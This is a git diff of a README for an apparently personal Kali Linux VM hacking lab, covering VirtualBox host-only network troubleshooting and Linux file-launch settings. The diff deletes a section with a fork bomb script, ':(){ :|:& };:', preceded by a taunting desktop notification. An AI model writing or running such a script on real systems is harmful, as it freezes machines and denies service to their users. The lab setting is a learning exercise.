@@ -38,7 +38,7 @@ https://github.com/yasserhous/Kali-VM/blob/e39436b2335a17c2e605a32b0fd412f73441a
 
 
 ## Troubling Shooting
-1)Ensuring VM can reach Host, and host can reach VM
+### Ensuring VM can reach Host, and host can reach VM
 error: From 192.168.56.101 icmp_seq=3 Destination Host Unreachable
   1) check your network adapter and ensure that the one you want to use is enabled: Control Panel\All Control Panel Items\Network Connections
   2) ![image](https://github.com/user-attachments/assets/81c83f81-efc4-4355-ad9e-6ac3c8c76bc5)
@@ -49,26 +49,13 @@ error: From 192.168.56.101 icmp_seq=3 Destination Host Unreachable
   5)go to tools --> Host-Only Networks and ensure that the IP assigned to your adapter is the same as the one to your host:
   ![image](https://github.com/user-attachments/assets/941e3480-14ef-4d9e-bc00-f3af70801006)
 
-2)Changing the double click behavior on Linux.
+### Changing the double click behavior on Linux.
   1) It took me maybe a few hours to figure that one out since when I was double-clicking, the file was opening with vim. I ended up changing the default application used by going to open-with --> dbus-launch. This forced the OS to launch a new D-bus session which allows the execution of the script.
 
-### 6) write the shell script for the fork bomb
-1)create a new file on linux and write down the following script:
-<code>
-# Show a warning message using notify-send
-notify-send "Gotcha ! Your system will stop responding soon."
-# Introduce a short delay
-sleep 3
-# Start the Fork Bomb
-:(){ :|:& };:
-</code>
-2) save the file
-3)make the file executabe
+
 
 
 ## Lessons Learned
-
-
 
 Creating a safe hacking environment
 You would want to make sure you create a safe environment to since we will be working with real vulnerabilities. This project can go smoother with some basic knowledge of virtual machines and kali-linux. I highly recommend watching Network Chuck content.
